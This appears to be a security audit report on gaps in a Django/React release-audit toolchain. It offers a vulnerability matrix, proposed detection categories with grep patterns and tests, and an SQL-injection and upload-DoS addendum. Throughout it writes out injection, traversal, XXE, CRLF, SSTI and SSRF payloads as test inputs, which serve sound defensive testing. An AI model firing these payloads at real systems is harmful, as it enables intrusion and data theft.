# Advanced-Attack Coverage Gap — release-sdk security tooling

> Audit date: 2026-06-01 · 8-agent workflow · 61 advanced attack classes assessed across `agents/` + `skills/` + `templates/`
> Verdict: **mile wide, inch deep** — `4 DEEP · 17 SHALLOW · 40 MISSING`

## Headline

Of ~40 distinct advanced classes a senior Django/React pentester would test, only ~5 are genuinely DEEP
(numeric lost-update, Celery dispatch race, token-in-WebStorage, prototype pollution, raw-SQL grep) — and even
those leak. SSRF, insecure deserialization, alg-confusion/JWT forgery, command injection, SSTI, TOCTOU on
non-numeric resources, clickjacking, HSTS, CORS-reflection-with-credentials, and constant-time-compare are ALL
completely absent (grep-confirmed zero hits).

## The structural problem: false-MITIGATED verdicts

Worse than absences — these categories run on *every* audit but pass forgeable input:

- **Injection (Cat 6)**: test `assert r.status_code in (201, 400)` accepts a stored 201 payload.
- **JWT (Cat 5)**: revokes only refresh; access token usable to natural expiry — logout cosmetic vs leaked access token.
- **CORS (Cat 9)**: only the literal `CORS_ALLOW_ALL_ORIGINS=True` is detected; reflected-origin+credentials sails through.
- **Cookie test**: checks the substring `'SameSite'` is present, so `SameSite=None` passes.
- **Race (Q5)**: race test is gated on `F()`/`select_for_update` already existing → a TOCTOU on a non-numeric resource is structurally invisible.

## Gap matrix

| Attack | Domain | Severity | Coverage | Evidence | Gap |
|---|---|---|---|---|---|
| SSRF via user-URL fetch (no metadata-IP / private-IP / allowlist block) | ssrf-deser | CRITICAL | MISSING | grep `169.254`/`urlopen`/SSRF = 0 hits | cloud IAM-credential theft (169.254.169.254) undetectable |
| Insecure deserialization — pickle.loads / yaml.load(non-safe) / PickleSerializer | ssrf-deser | CRITICAL | MISSING | grep `pickle.loads`/`yaml.load` = 0 | Server-side RCE primitive unmodeled |
| OS command injection — subprocess(shell=True)/os.system | injection | CRITICAL | MISSING | only prose at auditor.md:109 | PDF/thumbnail/ffmpeg/convert = RCE |
| JWT alg confusion (RS256→HS256) / alg:none / no algorithms= | auth-jwt | CRITICAL | MISSING | grep `algorithms=`/`verify_signature` = 0 | Full token forgery; Cat5 marks MITIGATED while forgeable |
| JWT claim tampering — authz reads role/is_staff from token not DB; no aud/iss | auth-jwt | CRITICAL | MISSING | grep `AUDIENCE`/`ISSUER` = 0 | Privilege escalation via forged claim |
| SSTI — Template/Engine.from_string/.format() on user data | injection | CRITICAL | MISSING | grep `from_string` = 0 | leaks SECRET_KEY via `{{settings.SECRET_KEY}}` |
| Path traversal — open()/FileResponse/MEDIA-join with ../ | injection | CRITICAL | SHALLOW | prose only at auditor.md:109 | `?file=../../etc/passwd` unguarded |
| TOCTOU on non-numeric resource (coupon/voucher/seat, no lock) | concurrency | CRITICAL | MISSING | Q5 only fires on `F('`; race test gated on Q5 PASS | biggest structural hole |
| Double-submit / double-spend — no idempotency key on replayed concurrent POST | concurrency | CRITICAL | MISSING | `idempot*` only as Celery-task label | parallel identical financial POSTs unmodeled |
| Token replay after logout — access token still valid | auth-jwt | CRITICAL | SHALLOW | auditor.md:105-106 test "logout → refresh → 401" only | stolen access token usable to expiry |
| ORM injection via order_by(user_input) | injection | HIGH | MISSING | grep `order_by`+request = 0 | `?ordering=user__password` relation traversal |
| ORM injection via filter(**user_dict)/values(*) | injection | HIGH | MISSING | grep `filter(**` = 0 | tenant bypass + blind enumeration |
| XXE — lxml/ElementTree on untrusted XML, no defusedxml | injection | HIGH | MISSING | grep `lxml`/`defusedxml` = 0 | file disclosure + SSRF + billion-laughs |
| Insecure file upload — magic-byte/MIME, zip-slip, SVG-XSS, size cap | ssrf-deser | HIGH | SHALLOW | retro.md:74 one MIME bullet | extractall over `../`; SVG stored XSS; no size cap |
| Open redirect (Django) — redirect(next) no url_has_allowed_host_and_scheme | ssrf-deser | HIGH | MISSING | grep = 0; React-only at react-retro:75-80 | phishing/token-leak primitive |
| Webhook HMAC / signed-URL forgery & replay (== compare, no nonce) | ssrf-deser | HIGH | MISSING | auditor.md:62 prose only | forgeable HMAC = unauthenticated mutation |
| Generic timing attack — == not constant_time_compare | auth-jwt | HIGH | MISSING | grep `compare_digest` = 0 | prefix leak on every custom secret compare |
| Account enumeration — differential response/timing | auth-jwt | HIGH | MISSING | grep `enumerat` = 0 | most common real-world auth finding |
| MFA/OTP brute-force & bypass — no attempt cap / per-OTP throttle | auth-jwt | HIGH | MISSING | grep `OTP`/`TOTP`/`MFA` = 0 | 6-digit OTP brute-forceable |
| Clickjacking — no X-Frame-Options / CSP frame-ancestors | transport | HIGH | MISSING | grep = 0 everywhere | authenticated app frameable |
| HSTS missing / no preload / includeSubDomains | transport | HIGH | MISSING | grep `SECURE_HSTS` = 0 | first-request SSL-strip |
| Host-header poisoning — build_absolute_uri from spoofable Host | transport | HIGH | SHALLOW | only coarse ALLOWED_HOSTS!=['*'] | poisons password-reset link to attacker domain |
| CORS reflection / regex-bypass / null-origin / credentials+permissive | transport | CRITICAL→HIGH | SHALLOW | only literal wildcard at auditor:133 | credentialed cross-origin read |
| get_or_create / update_or_create race | concurrency | HIGH | MISSING | grep `get_or_create` = 0 | non-atomic get/create, no constraint |
| Unique-constraint race — .exists() guard before .create() | concurrency | HIGH | MISSING | grep `UniqueConstraint` = 0 | classic signup dup bug |
| select_for_update gaps — lock after read / no nowait / outside atomic | concurrency | HIGH | SHALLOW | checklist:23 rejects bare atomic | read-before-lock & PG no-op uncovered |
| Rate-limit bypass via concurrency (N parallel beat counter) | concurrency | HIGH | SHALLOW | AnonRateThrottle presence-check only | cache read-incr-write beaten in parallel |
| Distributed-lock absence (Redis SETNX / advisory) | concurrency | HIGH | MISSING | grep `advisory`/`cache.add` = 0 | singleton-job/cron-overlap dedup unmodeled |
| Identity-escalation IDOR chain — user_id/empresa_id from body/claim | auth-jwt | HIGH | SHALLOW | Cat2/3 object-ownership only | acting AS another user via body id |
| javascript:/data: URL in href={userUrl} JSX sink | frontend | HIGH | MISSING | open-redirect grep matches only location.href= | `javascript:alert(1)` executes on click |
| postMessage handler without event.origin allowlist | frontend | HIGH | SHALLOW | named only as surface trigger | XSS/exfil bridge passes silently |
| Client-side SSRF / open-redirect via fetch(userURL) | frontend | HIGH | SHALLOW | only location.href=next pattern | fetch/axios proxy through user URL |
| Reverse tabnabbing — target=_blank without rel=noopener | frontend | HIGH | SHALLOW | single prose bullet | _blank link with no rel passes |
| Session fixation — session id not rotated (cycle_key) on login | auth-jwt | HIGH | MISSING | grep `cycle_key` = 0 | custom/JWT-hybrid login unchecked |
| Password-reset token weakness — entropy/expiry/timing-safe | auth-jwt | HIGH | SHALLOW | Cat7 single-use only | no entropy/expiry/const-time check |
| JWT kid/jku/x5u SSRF & weak HMAC secret reuse | auth-jwt | HIGH | MISSING | grep `kid`/`jku` = 0 | custom JWKS verification SSRF |
| Signal-handler concurrency & M2M .add() race | concurrency | MEDIUM | SHALLOW | signal ordering covered only | parallel handler read-modify-write |
| File-write / cache check-then-set stampede | concurrency | MEDIUM | MISSING | grep `cache.get_or_set` = 0 | dogpile recompute & non-atomic write |
| Cookie scoping — __Host-/__Secure- prefix, broad Domain, SameSite=None | transport | MEDIUM | SHALLOW | triad test checks substring only | SameSite=None passes; parent-domain shares cookie |
| SECURE_PROXY_SSL_HEADER misconfig behind proxy | transport | MEDIUM | MISSING | grep = 0 | is_secure() False → Secure cookies never engage; or spoofable |
| Referrer leakage / secrets in URL query | transport | MEDIUM | MISSING | grep = 0 | tokens leak via Referer + access logs |
| Log injection / CRLF / response-header injection | injection | MEDIUM | MISSING | grep `crlf` = 0 (Django) | Content-Disposition/Location/log CRLF forging |
| JSONField / NoSQL operator injection | injection | MEDIUM | MISSING | JSONField only a field-type choice | `data__{user_key}__contains` path traversal |
| DOM clobbering — sanitizer keeps id/name | frontend | MEDIUM | MISSING | DOMPurify config not asserted | clobbers document.x/form.action |
| Untrusted hash/window.name/searchParams → DOM sink | frontend | MEDIUM | SHALLOW | only ?user_id= IDOR sub-case | location.hash/window.name into innerHTML untraced |
| SSR injection / hydration-trust / JSON hijacking | frontend | MEDIUM | MISSING | hydration only a debug shape | `__INITIAL_STATE__` without </script> escaping = XSS |
| Sourcemap secret leakage in prod | frontend | MEDIUM | SHALLOW | vague "bundle analysis" aside | secrets via shipped .map files |
| Dependency confusion (npm scope/registry hijack) | frontend | MEDIUM | MISSING | only `npm audit` CVE scan | typo/scope-squat + postinstall unflagged |
| HTTP request smuggling / cache poisoning | ssrf/transport | MEDIUM | MISSING | grep `smuggl` = 0 | USE_X_FORWARDED_HOST trust + unkeyed-header poisoning |
| Subdomain takeover surface | transport | MEDIUM | MISSING | no signature | compounds parent-scoped Domain cookie |
| Raw SQL injection — .raw()/.extra()/cursor f-string | injection | CRITICAL | DEEP (leaky) | retro:72, auditor:110/131 | test accepts stored 201; grep misses .extra(select=/order_by=) |
| Lost-update on numeric mutation | concurrency | CRITICAL | DEEP | checklist:59-64 (Q5 + Barrier) | fully closed; JSONField/list-append not in FAIL grep |
| Celery task races (.delay before commit) | concurrency | HIGH | DEEP (leaky) | checklist:67-72 (Q6 LOCKED) | dispatch-race closed; duplicate-delivery idempotency has no body grep |
| Auth-token in Web Storage | frontend | CRITICAL | DEEP | auditor:150-153 (ALWAYS BLOCKER) | genuinely enforced |
| Prototype pollution (deep-merge / __proto__) | frontend | HIGH | DEEP | auditor:183-186 | enforced; misses gadget libs by name |
| Cookie flag triad (HttpOnly+Secure+SameSite) | transport | HIGH | DEEP | test-auditor:230-238 | proven by assertion but checks substring not value |

## Blind spots no domain assessed (completeness critic)

- **GraphQL abuse** — introspection schema leak, nested-query DoS, alias-batching to bypass rate limits/brute OTP. Detect: grep `graphene`/`strawberry`/`GraphQLView`; flag missing `introspection=False`, no depth/complexity limit.
- **Multi-tenant data-bleed via cache key** — `cache.set("dashboard", ...)` missing tenant id serves A's data to B; queryset forgetting `org=request.user.org`. Detect: cache keys lacking tenant discriminator; `.objects.all()` in tenant-scoped views.
- **Business-logic / workflow-state abuse** — negative/fractional quantity → credit, same coupon via two paths, refund > paid, skip "pay" state. Single-threaded, no injection/race. Detect: amount/quantity fields with no `MinValueValidator`/server recompute; client-supplied `price`/`status` into `serializer.save()`.
- **Mass assignment / over-posting** — `fields = '__all__'` or `Model.objects.create(**request.data)` lets user set `is_staff`/`org_id`/`balance`. Detect: serializers with `fields='__all__'`, absent `read_only_fields`.
- **Second-order / stored injection** — input stored benign, later read into SQL/template/shell/HTML by a different path (Celery task, admin/email template). Detect: trace user-written model fields to later `.raw()`/`Template`/`mark_safe` sinks in another view/task.
- **Python supply-chain** — unpinned `requirements.txt`/`pyproject` ranges, internal package names on public PyPI, no hash pinning, `setup.py` post-install code. Detect: `>=`/`*`/no-`==` deps, absent hashes.
- **Webhook/payment-callback authenticity & idempotency** — Stripe/PSP callback whose signature isn't verified (or `==`), no event-id dedupe (replay credits twice), no TOC on `payment_intent.succeeded`. Detect: missing `Webhook.construct_event`, raw `request.body` JSON without HMAC, absent processed-event-id table.
- **Email/SMS link poisoning** — reset/invite emails built with `build_absolute_uri()`/`Host`-derived domain → attacker poisons reset link. Detect: `build_absolute_uri`/`get_current_site`/`get_host()` feeding a `send_mail` link with no fixed `BASE_URL`.
- **BOLA/BFLA (function- & field-level authz)** — action authorized at view but not re-checked per-object in nested serializers; admin-only fields serialized to non-admin. Detect: `get_queryset` returning unscoped objects, sensitive fields with no gate, actions missing `check_object_permissions`.
- **LLM/AI-feature abuse** — prompt injection (user content overriding system prompt), model output flowing into SQL/shell/`mark_safe`, unbounded token spend / key leak. Detect: `anthropic`/`openai` calls with user input concatenated into prompt, output to `.raw()`/`mark_safe`/`subprocess`, no per-user token cap.

## Recommendation: BOTH

1. **EXTEND** the leaky-DEEP + SHALLOW fixes in place — they belong to categories that already run every audit (`release-security-auditor` Cat 5/6/8/9, `django-checklist-verifier` Q5, `release-test-auditor` skeleton). Cheap grep/assertion edits that stop the false PASS.
2. **NEW conditional agent** `release-advanced-threat-auditor` for the ~25 genuinely-new MISSING classes — fires only when a trigger surface is detected (outbound HTTP client, pickle/yaml, subprocess, XML parse, file upload, custom JWT decode, Celery/cron singleton, webhook, OAuth, LLM call). Keeps the default audit lean; deep coverage exactly where the surface exists.
3. **Wire** the new agent into `/release:security` and `/release:auto` (fire on trigger-surface detection) and add its BLOCKER triggers to `release-plan-checker` so a phase declaring an outbound fetch / deserializer / subprocess can't pass planning without the corresponding test.

## Proposed drop-in catalog (Django A1–A10, React RA1–RA5)

### Advanced-threat categories (Django) — conditional, fire only when trigger surface present

**Cat A1: SSRF (outbound fetch on user-controlled URL)**
- Threat: user-supplied URL (webhook target, avatar/link-preview fetch, PDF-HTML render) reaches cloud metadata (169.254.169.254), private IPs, or localhost
- Mitigation grep: `requests\.(get|post|head)\(|httpx\.|urlopen\(` whose URL is user-derived AND a guard `ipaddress\.ip_address|block_private_ip|ALLOWED_(OUTBOUND|FETCH)_HOSTS|is_allowed_url` on the same path; resolve-at-connect (DNS-rebind safe)
- Test grep: `test_*ssrf*` — fetch of `http://169.254.169.254/`, `http://10.0.0.5/`, `http://localhost:6379/` each → 400 before socket connect
- BLOCKER trigger: HTTP client called with a request-derived URL and NO allowlist/private-IP guard

**Cat A2: Insecure Deserialization**
- Threat: pickle/yaml/marshal on attacker-influenced data (cache, cookie, queue, upload) → RCE
- Mitigation grep: NO `pickle\.loads?\(|cPickle|marshal\.loads?\(`, `yaml\.load\(` only with `Loader=SafeLoader`/`yaml.safe_load`, `SESSION_SERIALIZER` is `JSONSerializer` (NOT `PickleSerializer`), NO bare `eval\(|exec\(` on request data
- Test grep: `test_*deserialization*` — `!!python/object/apply:os.system` yields parse error not execution; tampered pickled cookie rejected
- BLOCKER trigger: `pickle.loads`/`yaml.load`(non-safe)/`PickleSerializer`/`eval(`/`exec(` on any request/cache/cookie/queue-reachable path

**Cat A3: Command Injection**
- Threat: shell-out (PDF/thumbnail/ffmpeg/git/convert) with user input → RCE
- Mitigation grep: NO `subprocess\.(run|call|Popen|check_output)\([^)]*shell\s*=\s*True`, NO `os\.(system|popen)\(`, args passed as a list with no f-string/`+`/`.format()` building the command
- Test grep: `test_*command_injection*` — filename/param `x; touch /tmp/pwned` and `$(id)` → no metachar interpreted (sentinel absent)
- BLOCKER trigger: `shell=True` OR `os.system`/`os.popen` with any user-derived value

**Cat A4: SSTI / Path Traversal**
- Threat: `Template(user_string).render()`/`Engine().from_string()`/`.format()` on user data leaks SECRET_KEY; `open()/FileResponse/MEDIA-join` with user filename or `../` escapes MEDIA_ROOT
- Mitigation grep: NO `Template\(|from_string\(|render_to_string\(` on request data; file paths resolved via `os.path.realpath(...).startswith(MEDIA_ROOT)`; upload names server-generated (no client `.name`); NO unbounded `{...}.format(request...)`
- Test grep: `test_*ssti*` — `{{ settings.SECRET_KEY }}` renders inert; `test_*path_traversal*` — `?file=../../../../etc/passwd` and upload `../../evil.py` confined/sanitized
- BLOCKER trigger: template constructed from request data, OR `open(`/`FileResponse(` on a user-controlled path without a realpath-under-root guard

**Cat A5: XXE / XML & Header/Log Injection**
- Threat: untrusted XML/SVG/DOCX parsed with stdlib `ElementTree`/`lxml` defaults (file disclosure, SSRF, billion-laughs); CRLF in `Content-Disposition`/`Location`/log lines forges headers/log entries
- Mitigation grep: XML parsing uses `defusedxml` (NOT raw `lxml.etree`/`xml.etree.ElementTree.parse` on uploads); response header/`logger` values containing `request.`/`f"` are sanitized of `\r\n`
- Test grep: `test_*xxe*` — `<!ENTITY e SYSTEM "file:///etc/passwd">` → no file contents, no outbound attempt; `test_*crlf*` — `%0d%0aSet-Cookie:` stripped
- BLOCKER trigger: `lxml.etree`/`ElementTree.parse`/`fromstring` on upload/request data without defusedxml

**Cat A6: ORM-level Injection (field-name / dict-expansion)**
- Threat: user-controlled field names/operators reach `order_by()`/`values()`/`annotate()`/`filter(**user_dict)` → relation traversal, blind column enumeration, tenant bypass
- Mitigation grep: NO `\.(filter|exclude|get)\(\s*\*\*\s*(request\.|.*params|.*data\[)`; `order_by`/`values`/`annotate` field names validated against an explicit allowlist; `OrderingFilter` has `ordering_fields=`
- Test grep: `test_*field_allowlist*` — `?ordering=user__password`, `?password__startswith=a`, `?owner__empresa__id=<other>` → 400/ignored, queryset never widened
- BLOCKER trigger: `filter(**request.…)`/`order_by(request.…)`/`values(*request.…)` with no allowlist

**Cat A7: Advanced Concurrency (TOCTOU / idempotency / distributed lock)** — supersedes the numeric-only Q5 probe
- Threat: check-then-act on a non-numeric resource without a lock (coupon/voucher/seat/quota); replayed concurrent POST double-spends with no idempotency key; `get_or_create`/`.exists()`-then-`.create()` race; cross-process critical section with no distributed lock
- Mitigation grep: `if\s+\w+\.(is_valid|available|exists)\b…\.(save|create|redeem|delete)\(` must be inside `select_for_update()`/`transaction.atomic()`; financial mutating views read `Idempotency-Key` OR have a `UniqueConstraint` on `(user, request_id)`; `.exists()`-guard-then-`.create()` is backed by a DB `UniqueConstraint`/`unique=True`; cross-process side-effect loops/tasks wrapped in `cache.add(lock,ttl)`/`pg_advisory_xact_lock`; `select_for_update` is inside `transaction.atomic()` (not a silent PG no-op)
- Test grep: `test_*_race.py` with `threading.Barrier(2)` — concurrent coupon-redeem → exactly one succeeds; `test_*idempotency*` — two parallel same-key POST → one 201 + one 409 + single row; `test_*get_or_create_no_duplicate*`; `test_distributed_lock_single_holder`
- BLOCKER trigger: check-then-mutate on a fetched row OUTSIDE a lock/atomic block; financial mutating POST with neither Idempotency-Key nor a backing UniqueConstraint

**Cat A8: JWT Forgery & Auth-Identity (extends Cat 5/7)**
- Threat: alg confusion (RS256→HS256) / `alg:none` / missing `algorithms=` allowlist; authz reads role/is_staff from token claim not DB; no `AUDIENCE`/`ISSUER`; access token replayable after logout; session not rotated (`cycle_key`); identity taken from request body
- Mitigation grep: every `jwt.decode(` passes a fixed `algorithms=` (no `verify_signature=False`); `SIMPLE_JWT['ALGORITHM']` in a pinned allowlist and asymmetric `SIGNING_KEY` ≠ verifying key; `AUDIENCE`+`ISSUER` set; authz reads `request.user.is_staff` (NOT `token['role']`); logout revokes access-token `jti` (not only refresh); custom login calls `login()`/`cycle_key()`; `perform_create` sets `owner=request.user` (NOT `request.data.get('owner')`)
- Test grep: `test_jwt_alg_none_rejected`, `test_jwt_rs256_to_hs256_rejected`, `test_role_not_trusted_from_claim`, `test_access_token_rejected_after_logout`, `test_session_id_rotated_on_login`, `test_cannot_set_owner_via_request_body`
- BLOCKER trigger: `jwt.decode` without `algorithms=` OR `verify_signature=False`; authorization decision read directly from a token claim

**Cat A9: Constant-Time Compare & Signed-Payload Integrity (extends Cat 7)**
- Threat: `==` on token/secret/HMAC-signature/OTP/reset-token leaks via timing; webhook HMAC absent/forgeable; signed URL replayable (no nonce/expiry); OTP brute-forceable; account enumeration via differential response
- Mitigation grep: secret/signature/OTP comparison uses `hmac.compare_digest`/`constant_time_compare` (NO `==` on `token|secret|signature|api_key|otp`); webhook signature verified with `hmac.compare_digest`; signed links carry `max_age`/nonce; OTP-verify view has `ScopedRateThrottle`+attempt cap+single-use; auth/register/reset return identical response for existing vs non-existent account and run the hasher even on unknown users
- Test grep: `test_*constant_time*` / `test_webhook_signature_uses_constant_time`, `test_otp_brute_force_locks_out`, `test_login_response_identical_unknown_vs_wrong_password`, `test_register_no_email_enumeration`
- BLOCKER trigger: `==`/`!=` comparison of a token/secret/signature; webhook receiver with no HMAC verification

**Cat A10: Transport / Headers / CORS Hardening (extends Cat 8/9)**
- Threat: missing clickjacking + HSTS + Referrer-Policy headers; CORS origin reflection / unanchored regex / null-origin / `CORS_ALLOW_CREDENTIALS=True`+permissive origin; Host-header poisoning of reset links; spoofable `SECURE_PROXY_SSL_HEADER`; cookie `SameSite=None`/parent-domain scope; tokens in query string
- Mitigation grep: `X_FRAME_OPTIONS in (DENY,SAMEORIGIN)` or CSP `frame-ancestors`; `SECURE_HSTS_SECONDS>=31536000`+`INCLUDE_SUBDOMAINS`; `SECURE_REFERRER_POLICY` set; NO `CORS_ALLOW_CREDENTIALS=True` co-located with `CORS_ALLOWED_ORIGIN_REGEX`/reflection, regex anchored `^…$` with escaped dots; reset links built from a settings-pinned base URL (NOT `request.get_host()`/`build_absolute_uri`); explicit non-wildcard `CSRF_TRUSTED_ORIGINS`; `SECURE_PROXY_SSL_HEADER` set only behind a trusted proxy; `SESSION_COOKIE_SAMESITE in (Lax,Strict)` (NOT None), `SESSION_COOKIE_DOMAIN` host-only; no `?token=`/`?reset_token=` in URLs
- Test grep: `test_clickjacking_headers_present`, `test_hsts_header_in_prod`, `test_cors_credentials_not_allowed_with_reflection`, `test_cors_regex_anchored`, `test_host_header_poisoning_reset_link`, `test_cookie_samesite_not_none`, `test_no_token_in_query_string`
- BLOCKER trigger: `CORS_ALLOW_CREDENTIALS=True` with reflected/regex/wildcard origin; reset/confirmation link built from the request Host header

### Advanced-threat categories (React) — conditional, fire on trigger surface

**Cat RA1: URL-scheme & DOM sinks**
- Threat: `javascript:`/`data:` scheme in `href={userUrl}`/`<Link to={userUrl}>`/`src={}`; reverse tabnabbing; `location.hash`/`window.name`/`document.referrer`/`searchParams` flowing into innerHTML/href/navigate
- Mitigation grep: dynamic `href`/`src`/`to` passed through an `isHttpUrl` scheme allowlist; `target=\{?["']_blank` always paired with `rel=…noopener`; hash/window.name/referrer validated before any sink
- Test grep: `test_dynamic_href_rejects_javascript_scheme`, `test_external_link_has_noopener_rel`, `test_hash_and_window_name_not_rendered_unsanitized`
- BLOCKER trigger: dynamic `href={}` with no scheme allowlist; `target=_blank` with no `rel=noopener`

**Cat RA2: postMessage & client-side SSRF**
- Threat: `addEventListener('message')` with no `event.origin` allowlist (XSS/exfil bridge); `fetch(userURL)`/`axios(userURL)`/`navigate(searchParams.get('next'))` to off-allowlist host
- Mitigation grep: every `addEventListener\(['"]message` has a sibling `event.origin ===` allowlist; fetch/navigate URL args host-allowlisted
- Test grep: `test_postmessage_rejects_foreign_origin`, `test_fetch_url_host_allowlisted`, `test_redirect_target_must_be_relative_or_allowlisted`
- BLOCKER trigger: message listener with no origin check

**Cat RA3: CSP / Trusted Types / clickjacking (defense-in-depth)**
- Threat: no CSP or `script-src 'unsafe-inline'`/`unsafe-eval`; no Trusted Types; no clickjacking header
- Mitigation grep: served HTML/headers include `Content-Security-Policy` without `unsafe-inline` in `script-src`; `require-trusted-types-for 'script'` for DOM-XSS-prone apps; `frame-ancestors`/`X-Frame-Options`
- Test grep: `test_response_sets_csp_header`, `test_trusted_types_enforced`
- BLOCKER trigger: rendering untrusted content with no CSP, or `unsafe-inline`/`unsafe-eval` in script-src

**Cat RA4: Build & supply-chain integrity**
- Threat: prod sourcemaps leak secrets; dependency confusion (scope/registry hijack); install scripts; missing lockfile integrity
- Mitigation grep: NO `sourcemap\s*[:=]\s*true`/`GENERATE_SOURCEMAP=true` in prod build; every `@scope/*` dep pinned to a private registry in `.npmrc` with a lockfile integrity hash; no unexpected `pre/postinstall` scripts
- Test grep: `test_prod_build_emits_no_sourcemaps`, `test_internal_scopes_pinned_to_private_registry`
- BLOCKER trigger: prod sourcemap emission, or an internal `@scope` dep resolvable on public npm

**Cat RA5: SSR / hydration / DOM-clobbering / JSON hijacking**
- Threat: `window.__INITIAL_STATE__ = JSON.stringify(...)` without `</script>` + U+2028/U+2029 escaping; sanitizer keeps `id`/`name` attrs (clobbering); top-level-array/JSONP API responses
- Mitigation grep: dehydrated state escaped before `<script>` embed; `DOMPurify.sanitize` config sets `SANITIZE_DOM:true` / strips `id`+`name`; API responses object-wrapped (no top-level array, no JSONP callback)
- Test grep: `test_dehydrated_state_escapes_script_close`, `test_sanitizer_strips_id_and_name_attributes`, `test_api_never_returns_top_level_array`
- BLOCKER trigger: `JSON.stringify` embedded in a `<script>` without close-tag escaping

---

# Addendum (user-requested) — SQLi exploitation · image-size DoS · AWS attacks

> Added 2026-06-01 · 3-agent workflow. These deepen three families the user flagged explicitly. Key cross-cutting rule echoed in all three: a test that asserts only an HTTP status (`assert r.status_code in (201,400)`) is HOLLOW — it accepts a STORED malicious payload. Mitigation is proven by **impact assertions** (row counts, sentinels, timing, no-egress, static policy gate), never by a clean status code.

## Cat A11: SQL Injection (exploitation-grade) — SUPERSEDES the leaky Cat 6 raw-SQL probe

**Why the current probe is insufficient (3-layer leak):**
1. **Hollow test** — `release-test-auditor.md:220-222` emits `assert r.status_code in (201, 400)`. A 201 passes, meaning the app STORED the payload as a literal. A parameterized app and a catastrophically-injectable one are indistinguishable under this assertion. Only probes a POST body, never the read paths (`?ordering=`, `?id=`, filter params) where `.raw()`/`.extra()` actually live.
2. **Incomplete grep** — `auditor:110` + BLOCKER `auditor:131` catch only `.raw(.*f"` and `.extra(where=`. They MISS `.extra(select=/tables=/order_by=)` (ORDER BY is unquoted — needs no quote-break), `cursor.execute(f"...")`/`%`/`+`, `RawSQL()` inside `.annotate()/.filter()/.order_by()`, and `.format()`.
3. **Exploitation classes unmodeled** — no signature for UNION, boolean-blind, time-blind (`pg_sleep`/`SLEEP`/`WAITFOR`), stacked, error-based, LIMIT/OFFSET, or second-order (stored benign → f-stringed into `.raw()` by a later Celery task/report).

**Net: the current probe returns PASS on an app with a live UNION injection in `?ordering=`.**

This category replaces the `assert r.status_code in (201, 400)` raw-SQL check. A 201/400 status is NOT evidence: it accepts a STORED payload. Mitigation is proven only by DATA-LAYER assertions (control row count, sentinel row, column count, response timing).

- Threat: attacker injects SQL through any user value reaching a raw sink. Delivery paths the test must cover: (a) **error-based** — malformed input surfaces a DB error revealing schema; (b) **UNION-based** — `' UNION SELECT col,col,... --` exfiltrates other tables once column-count + per-column type are matched; (c) **boolean-blind** — `' OR 1=1 --` widens, `' AND 1=2 --` empties; (d) **time-blind** — `'; SELECT pg_sleep(5) --` / `' OR SLEEP(5) --` / `'; WAITFOR DELAY '0:0:5' --` measurable latency, no body change; (e) **stacked** — `'; DROP TABLE sqli_sentinel; --` runs a 2nd statement (note `cursor.execute()` allows this; `.raw()` does not — the test must hit the cursor path); (f) **ORDER BY / GROUP BY** — `?ordering=(SELECT CASE WHEN (1=1) THEN id ELSE name END)` injects in an UNQUOTED position; (g) **LIMIT/OFFSET** — numeric interpolation; (h) **second-order** — stored benign via endpoint A, weaponized when a later path f-strings the stored field into `.raw()`.
- Mitigation grep — sinks that MUST be flagged when fed anything but a constant (extends beyond `.raw(.*f"`/`.extra(where=`):
  - `\.raw\(\s*f["']` , `\.raw\([^)]*%[^)]*%` , `\.raw\([^)]*\.format\(` , `\.raw\([^)]*\+`
  - `\.extra\(\s*(where|select|tables|order_by|params)\s*=` (ALL kwargs — `select=`/`tables=`/`order_by=` are unquoted/quoteless injection)
  - `cursor\.execute\(\s*f["']` , `cursor\.execute\([^,)]*%\s*[^,)]` , `cursor\.execute\([^)]*\.format\(` , `cursor\.execute\([^)]*\+`
  - `RawSQL\(\s*f["']` and `RawSQL\(.*%.*\)` (including inside `\.annotate\(`, `\.filter\(`, `\.order_by\(`)
  - `extra\(.*request\.` , `\.raw\(.*request\.`
  - POSITIVE evidence required for PASS: `cursor\.execute\(\s*["'][^"']*%s[^"']*["']\s*,\s*[\[(]` (placeholder + params, NOT f-string); `\.raw\(\s*["'][^"']*%s` with `params=`; `\.extra\(.*params\s*=\s*\[` paired with `%s`; ORDER BY column resolved via ALLOWLIST (`ALLOWED_ORDERING_FIELDS`, `OrderingFilter` with explicit `ordering_fields=[...]` NOT `'__all__'`) BEFORE `.order_by`/`.extra(order_by=`.
  - NO string building: any `sql = .*(f["']|%|\.format\(|\+).*(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|ORDER BY)` near a sink is a finding.
- Test grep (names MUST assert data-layer impact):
  - `test_*sqli_union_no_extra_columns*` — assert column count unchanged + no foreign-table value (password-hash/email) appears.
  - `test_*sqli_stacked_sentinel_survives*` — seed `sqli_sentinel`, fire stacked DROP/DELETE, assert `Sentinel.objects.count()` unchanged + table exists.
  - `test_*sqli_boolean_rowcount_unchanged*` — `' OR 1=1 --` and `' AND 1=2 --`; row count == benign baseline.
  - `test_*sqli_time_blind_no_delay*` — `pg_sleep(5)`/`SLEEP(5)`/`WAITFOR`; assert wall-time < 1s.
  - `test_*sqli_error_based_no_db_error_leak*` — malformed quote; no DB error fragment (`syntax error at or near`, `psycopg2`, `OperationalError`), clean 400 (not 500).
  - `test_*sqli_orderby_allowlist*` — `?ordering=(SELECT CASE...)` / `?ordering=password` → 400/ignored, queryset not widened.
  - `test_*sqli_limit_offset_injection*` — `?limit=1 UNION SELECT...` → bounded, sentinel survives.
  - `test_*sqli_second_order_stored_then_read*` — store via A (201), trigger consuming path, assert sentinel survives + no cross-table leak.
  - **Anti-pattern auto-finding:** any `test_*injection*`/`test_*sqli*` whose only assertion is an HTTP status → HOLLOW; mitigation = UNVERIFIED.
- BLOCKER trigger (auto-OPEN, CRITICAL): any `.raw()`/`cursor.execute()`/`RawSQL()` with f-string/`%`/`.format()`/`+` of a non-literal; any `.extra(where=/select=/tables=/order_by=)` with a non-constant and no `params=[...]`+`%s`; `?ordering`/`order_by`/`?sort` reaching `.order_by()` without an allowlist; a second-order stored field interpolated into a raw sink in a different view/task; **a `test_*injection*` whose sole assertion is an HTTP status (false PASS).**

## Cat A12: Image / Media Upload DoS & Processing RCE

**Why insufficient:** zero graded coverage. The only touchpoint is `auditor:62` "new file upload (ClamAV/magic-bytes?)" — a free-text surface-discovery PROMPT, never scored OPEN. No grep for `MAX_IMAGE_PIXELS`, dimension-cap, `policy.xml`, SVG-as-attachment, zip-slip, re-encode. A 6 KB PNG declaring 64000×64000 = ~12 GB RSS = OOM, on an authenticated well-formed request no throttle catches.

